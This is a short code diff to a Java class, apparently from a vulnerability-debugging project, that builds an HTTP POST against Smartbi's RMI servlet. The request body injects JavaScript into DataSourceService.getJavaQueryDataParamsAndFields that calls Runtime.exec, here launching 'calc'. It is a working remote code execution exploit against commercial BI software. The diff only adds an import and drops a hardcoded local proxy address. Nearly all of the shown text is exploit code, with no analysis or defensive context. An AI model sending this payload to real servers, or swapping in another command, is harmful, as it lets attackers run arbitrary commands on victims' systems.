@@ -2,6 +2,7 @@ package cve;
 
 import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
 import org.apache.http.client.methods.HttpPost;
+import smartbi.framework.rmi.RMIServlet;
 
 import java.io.IOException;
 import java.net.URLEncoder;
@@ -19,7 +20,7 @@ public class PATCH_20230703 {
         queryString = URLEncoder.encode(queryString,"UTF-8");
         String body = "className=DataSourceService&methodName=getJavaQueryDataParamsAndFields&params=[\"smartbi.JavaScriptJavaQuery\",{\"javaScript\":\"importClass(java.lang.Runtime);var runtime = Runtime.getRuntime();runtime.exec('calc');\"},\"AP_WARNING_STYLE_SETTING\"]";
 
-        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
+        HttpRequest httpRequest = new HttpRequest();
         HttpPost httpPost = new HttpPost(url + queryString);
         httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
         httpRequest.sendStringPost(httpPost,body);
